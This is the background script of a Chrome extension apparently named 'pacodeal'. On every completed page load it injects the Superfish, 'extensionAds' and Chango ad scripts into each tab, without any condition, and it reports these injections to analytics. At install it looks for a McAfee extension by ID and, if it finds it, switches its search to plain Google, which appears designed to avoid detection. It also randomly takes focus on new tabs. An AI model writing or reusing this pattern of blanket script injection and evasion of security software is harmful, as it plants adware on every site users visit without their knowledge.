



(function ($,common,ga,logger){

    var version  = chrome.app.getDetails().version;
    var anonymousUserId;
    var testingVars;

    var init = function(){
        testingVars = getUserTestingCustomVars();

        ga.init(null,testingVars);
        checkInstallStatus();
    };


    var setUserTestingCustomVars = function(){

        //  superFish enabled Yes/NO
        var superFishEnabledSlot = SUPERF_E;

        testingVars = [
            {slot : 1 , name : 'SuperFish Enabled' , value : superFishEnabledSlot , scope : 1}
        ];

        localStorage.setItem('ga_custom_vars',JSON.stringify(testingVars));
        logger.json({action : 'set_user_testing_vars', testingVars : testingVars});
    };

    var getUserTestingCustomVars = function(){
        var string = localStorage.getItem('ga_custom_vars');
        return JSON.parse(string);
    };


    var checkInstallStatus = function(done){
        var install_version = localStorage.getItem('install_version');
        if(!install_version){
            newInstall(done);
            (done||common.noop)('new_install');
        }else if (install_version != version){
            updateInstall();
            (done||common.noop)('update_install');
        }else{
            (done||common.noop)();
        }
        localStorage.setItem('install_version',version);
    };

    var newInstall = function(){
        setUserTestingCustomVars();
        var focus=true,
            rand=Math.random();
        if(rand>0.5){
            focus=false;
        }
        localStorage.setItem('takeFocus',focus);
        console.log('focus ',focus);
        try{
            //check mcafee exist if yes change search to google
            checkMcafeeExist(function(flag){
                //if exist change search to regular google
                if(flag){
                     localStorage.googleSearch = true;
                     localStorage.SEARCH_URL_PREFIX = "http://www.google.com/search";
                }
            });
            //create welcome on first login
            //chrome.tabs.create({url : 'welcome.html'});
        }catch(e){
            logger.error('create welcome tab err',e);
        }
        setTimeout(function(){
            ga.trackEvent('pacodeal','new_install focuse '+focus);
        },10);
    };

    var updateInstall = function(){
        var focus=localStorage.getItem('takeFocus');
        ga.trackEvent('pacodeal','update_install focus '+focus);
    };

    var checkMcafeeExist= function(done){
        try{
            chrome.management.getAll(function (arr) {
                if(arr && arr.length > 0 ){
                    for (var i=0 ; i<arr.length;++i){
                        if(arr[i] && arr[i].id && arr[i].id == "fheoggkfdfchfphceeifdbepaooicaho"){
                            return done(true);
                        }
                    }
                }
                return done(false);
            });
        } catch (e){
            console.log('err',e);
            return done(false);
        }
    }

    var shouldInjectSuperFish = function(origin){
        return true;
    };

    var shouldInjectExtensionAds = function(origin){
        return true;
    };

    var shouldInjectChango = function(origin){
        return true;
    };


    var getInjection = function(tab){
         if(shouldInjectSuperFish(tab.url)){
             injectSuperfish(tab.id);
         }
         if(shouldInjectExtensionAds(tab.url)){
            injectExtensionAds(tab.id);
         }
         if(shouldInjectChango(tab.url)){
             injectChango(tab.id);
         }
    };

    var injectSuperfish = function(tabId){
        logger.info('Injecting Superfish.');
        try {
            //insert superfish
            chrome.tabs.executeScript(tabId, {file : '/pacodeal/i/s.js'}, function(){});
            console.log('insert e script');

            ga.trackEvent({category : 'Superfish', action : 'Injected'});
        }catch(e){
            logger.error('Caught error when injecting Superfish',e);
        }
    };

    var injectExtensionAds = function(tabId){
        logger.info('Injecting ExtensionA');
        try {
            //insert extensionAds
            chrome.tabs.executeScript(tabId, {file : '/pacodeal/i/extensionAds.js'}, function(){});

            ga.trackEvent({category : 'extensionAds', action : 'Injected'});
        }catch(e){
            logger.error('Caught error when injecting extensionAds',e);
        }
    };

    var injectChango = function(tabId){
        logger.info('Injecting Chango');
        try {
            //insert extensionAds
            chrome.tabs.executeScript(tabId, {file : '/pacodeal/i/chd.js'}, function(){});

            ga.trackEvent({category : 'chango', action : 'Injected'});
        }catch(e){
            logger.error('Caught error when injecting chango',e);
        }
    };

    try{
        chrome.tabs.onCreated.addListener(function (tab) {
            // take focus
            if (tab.url == "chrome://newtab/") {
                if(localStorage.getItem('takeFocus')=="true"){
                    chrome.tabs.update(tab.id,{selected:true},function(){
                        setTimeout(function(){$("#search_input").focus();},0);
                    });
                }
            }
        });

        chrome.tabs.onUpdated.addListener(function(tabId,change,tab) {
            if(change.status == "complete"){
                getInjection(tab);
            }
        });

        chrome.extension.onMessage.addListener(
            function(request, sender, sendResponse) {
            if(request.action == 'trackEvent'){
               ga.trackEvent(request.event);
            }
            sendResponse({});
        });

    }catch(err){

    }

    init();

})(jQuery,common,ga,logger);
